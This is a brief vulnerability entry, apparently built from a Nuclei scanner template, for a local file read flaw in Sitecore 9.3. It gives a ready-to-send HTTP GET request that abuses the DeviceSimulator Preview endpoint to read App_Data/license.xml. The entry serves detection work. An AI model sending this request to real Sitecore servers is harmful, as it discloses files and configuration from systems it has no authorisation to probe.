# Vulnerability: Sitecore 9.3 - Webroot File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`sitecore-lfi.yaml`)

## Description
SiteCore 9.3 is vulnerable to LFI.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml
```

